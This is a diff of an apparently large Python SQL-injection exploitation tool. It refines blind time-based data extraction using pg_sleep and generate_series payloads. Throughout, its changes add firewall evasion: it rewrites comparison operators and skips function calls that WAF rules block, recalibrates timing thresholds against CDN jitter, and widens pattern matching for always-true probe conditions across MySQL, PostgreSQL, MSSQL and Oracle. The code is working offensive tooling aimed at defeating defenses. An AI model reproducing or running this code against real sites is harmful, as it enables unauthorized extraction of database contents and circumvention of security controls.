@@ -48626,9 +48626,13 @@ class Enumerator:
                             # Heavy query — use generate_series which WAFs don't block
                             # CASE WHEN gates the computation: true→N rows (slow), false→1 row (fast)
                             _rows = max(1000000, min(int(_t * 1000000), 10000000))
+                            # BUG-BUILD-TIMING-PAYLOAD-TF-PG-HQ FIX: `>0` operator may be
+                            # blocked by WAFs with aggressive SQLi pattern matching.
+                            # `IS NOT NULL` is semantically equivalent (count() is never NULL)
+                            # but avoids the `>` comparison operator that triggers some WAF rules.
                             return (f"{_pfx}AND (SELECT count(*) FROM "
                                     f"generate_series(1,CASE WHEN ({_cond}) "
-                                    f"THEN {_rows} ELSE 1 END))>0{_sfx}")
+                                    f"THEN {_rows} ELSE 1 END)) IS NOT NULL{_sfx}")
                         else:
                             return (f"{_pfx}AND (CASE WHEN ({_cond}) "
                                     f"THEN (SELECT CAST(pg_sleep({_t}) AS TEXT)) "
@@ -48722,11 +48726,17 @@ class Enumerator:
                                      "(config.time_sec=%.1f vs stored t=%.1f)",
                                      _ebf_tf_cache_key, _ak, _t_sec_tf, _alt_t_cand)
                             break
+                # BUG-EXTRACT-STR-NOFUNC-UNREAD FIX: initialize nofunc flag before the
+                # conditional block so it is always defined regardless of cache hit.
+                _ebf_tf_nofunc = False
                 if _ebf_tf_found_key:
                     _ebf_tf_entry   = _TB_EBF_CACHE[_ebf_tf_found_key]
                     _ebf_tf_tmpl    = _ebf_tf_entry[0]
                     _ebf_tf_wrapper = _ebf_tf_entry[2] if len(_ebf_tf_entry) > 2 else "{cond}"
                     _ebf_tf_tag     = _ebf_tf_entry[3] if len(_ebf_tf_entry) > 3 else ""
+                    # FIX-C: read nofunc flag (index 4) — previously unread, causing
+                    # CHAR_LENGTH/ASCII/ORD calls on WAF targets that block them.
+                    _ebf_tf_nofunc  = _ebf_tf_entry[4] if len(_ebf_tf_entry) > 4 else False
                     if _ebf_tf_tmpl:
                         LOG.info("[_extract_str] EBF bypass found in cache — wiring into timing "
                                  "fallback oracle (key=%s tmpl=%.60r wrapper=%r tag=%r)",
@@ -48756,6 +48766,26 @@ class Enumerator:
                             _t_thresh_tf = float(_ebf_cal_thresh[0])
                             LOG.info("[_extract_str] Using EBF calibrated threshold=%.0fms "
                                      "(from tuple) for timing fallback oracle", _t_thresh_tf)
+                        # BUG-EBF-THRESH-OUTLIER FIX (FIX-B): A single outlier true probe
+                        # during EBF calibration (e.g. CDN hiccup giving 11140ms for SLEEP(2))
+                        # stores thresh=(321+11140)/2=5730ms.  When this is loaded here and
+                        # used for ISNULL(NULL) validation, SLEEP(2) at ~2000ms < 5730ms
+                        # returns False → oracle abandoned → "No oracle available".
+                        # Cap: thresh must not exceed max(sleep_expected*0.7, base+200, 600).
+                        # Extract sleep duration from the EBF template (e.g. SLEEP(2) → 2000ms).
+                        _ebf_sleep_re = _re.search(
+                            r'(?:SLEEP|pg_sleep|randomblob)\s*\(\s*(\d+(?:\.\d+)?)',
+                            _ebf_tf_tmpl or '', _re.I)
+                        _ebf_sleep_sec = float(_ebf_sleep_re.group(1)) if _ebf_sleep_re else _t_sec_tf
+                        _ebf_sleep_ms_cap = _ebf_sleep_sec * 1000.0
+                        _ebf_thresh_cap = max(_ebf_sleep_ms_cap * 0.7, _base_ms_tf + 200.0, 600.0)
+                        if _t_thresh_tf > _ebf_thresh_cap:
+                            LOG.info("[_extract_str] EBF threshold outlier capped: %.0fms→%.0fms "
+                                     "(sleep=%.0fms base=%.0fms) — prevents SLEEP(%.0fs) probes "
+                                     "from always falling below threshold",
+                                     _t_thresh_tf, _ebf_thresh_cap,
+                                     _ebf_sleep_ms_cap, _base_ms_tf, _ebf_sleep_sec)
+                            _t_thresh_tf = _ebf_thresh_cap
 
                 # BUG-TF-OBFUS FIX: Mutable request counter for per-probe obfuscation seed.
                 # Captured as a default arg so the closure holds a single list object
@@ -49002,7 +49032,21 @@ class Enumerator:
         # BUG-R7-4 FIX (MSSQL): LEN() strips trailing spaces, so a value like
         # 'admin   ' reports length 5 instead of 8.  DATALENGTH()/2 counts all bytes
         # (nvarchar uses 2 bytes/char) and does NOT strip trailing spaces.
-        if self.dbms == "PostgreSQL":
+        # BUG-EXTRACT-STR-CHARLEN-NOFUNC FIX (FIX-D): When the EBF nofunc flag is set
+        # (WAF blocks function calls like CHAR_LENGTH/ASCII/ORD), the length binary
+        # search using CHAR_LENGTH(...) also gets WAF-blocked → all probes return None
+        # → binary search aborts → _length=0 → returns "".
+        # Fix: set _len_q=None in nofunc+timing_fallback mode; the binary search below
+        # is guarded by `if _len_q is not None` and falls back to a safe default length
+        # (_ext_max_pre capped at 128) once _ext_max_pre is computed.
+        _nofunc_len_skip = (
+            _ebf_tf_nofunc
+            and _oracle_name.startswith("timing_fallback")
+        )
+        if _nofunc_len_skip:
+            # Sentinel — binary search below checks for None and skips.
+            _len_q = None
+        elif self.dbms == "PostgreSQL":
             _len_q = f"CHAR_LENGTH(({sql}))"
         elif self.dbms == "MSSQL":
             # BUG-ENUM-MSSQL-LEN FIX: The previous comment wrongly claimed that
@@ -49066,31 +49110,39 @@ class Enumerator:
         # _ext_max_pre+1 which the post-loop guard catches).
         low, high = 0, _ext_max_pre + 1  # hi is exclusive per _randomized_mid contract
         _bs_iter = 0  # binary-search iteration counter for yield points
-        while low < high:
-            # Yield to the event loop every 4 iterations so asyncio can service
-            # timers, cancellations, and other coroutines (prevents 100% CPU on LAN).
-            _bs_iter += 1
-            if _bs_iter % 4 == 0:
-                await asyncio.sleep(0.001)
-            # Also abort if extraction was externally cancelled.
-            if not _EXTRACTION_ACTIVE[0]:
-                LOG.debug("[_extract_str] _EXTRACTION_ACTIVE cleared — aborting length search")
-                break
-            # _randomized_mid returns a pivot in [low, high-1] (TECHNIQUE-3 WAF jitter).
-            mid = _randomized_mid(low, high)
-            try:
-                # Probe: is length >= mid+1? (equivalent to length > mid, avoids strict >)
-                gt = await _eval_fn(f"({_len_q})>={mid+1}")
-                # None = WAF-blocked probe — abort rather than narrowing wrongly.
-                if gt is None:
+        # FIX-D (continued): _len_q=None signals nofunc mode — skip binary search and
+        # use a conservative default.  _ext_max_pre is now computed, so we can cap safely.
+        if _len_q is None:
+            _length = min(_ext_max_pre, 128)
+            LOG.info("[_extract_str] nofunc+timing_fallback: skipping CHAR_LENGTH binary "
+                     "search, using default length=%d (actual end detected during char "
+                     "extraction via NUL/empty streak)", _length)
+        else:
+            while low < high:
+                # Yield to the event loop every 4 iterations so asyncio can service
+                # timers, cancellations, and other coroutines (prevents 100% CPU on LAN).
+                _bs_iter += 1
+                if _bs_iter % 4 == 0:
+                    await asyncio.sleep(0.001)
+                # Also abort if extraction was externally cancelled.
+                if not _EXTRACTION_ACTIVE[0]:
+                    LOG.debug("[_extract_str] _EXTRACTION_ACTIVE cleared — aborting length search")
                     break
-                elif gt:
-                    low = mid + 1
-                else:
-                    high = mid
-            except Exception:
-                break
-        _length = low  # lo IS the length when Style A converges correctly
+                # _randomized_mid returns a pivot in [low, high-1] (TECHNIQUE-3 WAF jitter).
+                mid = _randomized_mid(low, high)
+                try:
+                    # Probe: is length >= mid+1? (equivalent to length > mid, avoids strict >)
+                    gt = await _eval_fn(f"({_len_q})>={mid+1}")
+                    # None = WAF-blocked probe — abort rather than narrowing wrongly.
+                    if gt is None:
+                        break
+                    elif gt:
+                        low = mid + 1
+                    else:
+                        high = mid
+                except Exception:
+                    break
+            _length = low  # lo IS the length when Style A converges correctly
 
         if _length <= 0 or _length > _ext_max_pre:
             return ""
@@ -142793,6 +142845,17 @@ class ExtractionBypassFinder:
                     print(f"[EBF] structural bypass true={elapsed:.0f}ms < {_ebf_expected_ms*0.5:.0f}ms "
                           f"(half of SLEEP({getattr(self.config,'time_sec',5)}))  CDN jitter, skipping")
                     continue
+                # BUG-EBF-THRESH-OUTLIER FIX (FIX-A): A single outlier true probe (e.g.
+                # CDN hiccup giving 11140ms for SLEEP(2)) sets thresh=(321+11140)/2=5730ms,
+                # far above the actual sleep duration (~2000ms).  Subsequent extraction
+                # probes at ~2000ms never reach 5730ms → all return False → empty strings.
+                # Cap: thresh must not exceed max(sleep_expected*0.8, false_baseline+300).
+                _thresh_cap_a = max(_ebf_expected_ms * 0.8, _elapsed_false + 300.0)
+                if thresh > _thresh_cap_a:
+                    LOG.info("[EBF] threshold outlier capped: %.0fms→%.0fms "
+                             "(false=%.0fms expected=%.0fms)",
+                             thresh, _thresh_cap_a, _elapsed_false, _ebf_expected_ms)
+                    thresh = _thresh_cap_a
                 print(f"[+] [EBF] structural bypass: true={elapsed:.0f}ms "
                          f"false={_elapsed_false:.0f}ms thresh={thresh:.0f}ms tc={tc}", flush=True)
 
@@ -143579,7 +143642,11 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # calibration probe (high baseline) but current baseline is much
         # lower.  If the cached threshold > current_baseline + 3× sleep,
         # the oracle would never fire → invalidate and force re-calibration.
-        _max_reasonable = _base_time + t * 1000 * 3.0
+        # BUG-6-STALE-THRESH-CAP FIX (FIX-E): multiplier was 3.0 which allows outlier
+        # thresholds to pass (e.g. 5730ms accepted for SLEEP(2)/base=100 since
+        # 5730 < 100+2000*3.0=6100).  Reduce to 1.5 so 5730 > 100+2000*1.5=3100
+        # correctly invalidates the stale entry and forces fresh calibration.
+        _max_reasonable = _base_time + t * 1000 * 1.5
         if _cached_thresh > _max_reasonable:
             print(f"[!] [TBExtract] Cached thresh={_cached_thresh:.0f}ms is unreachable "
                   f"with current baseline={_base_time:.0f}ms sleep={t}s "
@@ -148913,9 +148980,29 @@ class ExtractionOrchestrator:
         _body = (_payload_raw[:len(_payload_raw)-len(_suffix)].rstrip()
                  if _suffix else _payload_raw)
 
+        # BUG-COND-PAT-ISNULL FIX (FIX-G): The original regex only matched simple
+        # numeric/boolean comparisons (1=1, TRUE, 1>0) but missed DBMS-specific
+        # always-true/always-false probe conditions used by EBF bypass templates:
+        #   ISNULL(NULL)           -- MySQL: NULL IS NULL → always true
+        #   ISNULL(1e0)            -- MySQL: 1.0 IS NULL → always false
+        #   1e0 IS NOT NULL        -- ANSI always-true
+        #   1e0 IS NULL            -- ANSI always-false
+        #   NVL(NULL,1e0) IS NOT NULL  -- Oracle always-true
+        # When unmatched, both calibration probes in _extract_via_detection_template
+        # fire SLEEP unconditionally → margin ≈ 0 → calibration fails → extractor aborts.
+        # Fix: extend alternation to cover these DBMS-specific probe conditions.
         _cond_pat = re.search(
-            r'(\(\s*)?(true\s*=\s*true|false\s*=\s*false'
-            r'|\d+\s*=\s*\d+|TRUE|FALSE|\d+\s*>\s*\d+|\d+\s*<\s*\d+)(\s*\))?',
+            r'(\(\s*)?('
+            r'ISNULL\s*\(\s*NULL\s*\)'
+            r'|ISNULL\s*\(\s*1e0\s*\)'
+            r'|1e0\s+IS\s+NOT\s+NULL'
+            r'|1e0\s+IS\s+NULL'
+            r'|NVL\s*\(\s*NULL\s*,\s*1e0\s*\)\s+IS\s+NOT\s+NULL'
+            r'|NVL\s*\(\s*NULL\s*,\s*1e0\s*\)\s+IS\s+NULL'
+            r'|NULL\s+IS\s+(?:NOT\s+)?NULL'
+            r'|true\s*=\s*true|false\s*=\s*false'
+            r'|\d+\s*=\s*\d+|TRUE|FALSE|\d+\s*>\s*\d+|\d+\s*<\s*\d+'
+            r')(\s*\))?',
             _body, re.I)
         if _cond_pat:
             _pre  = _cond_pat.group(1) or ""
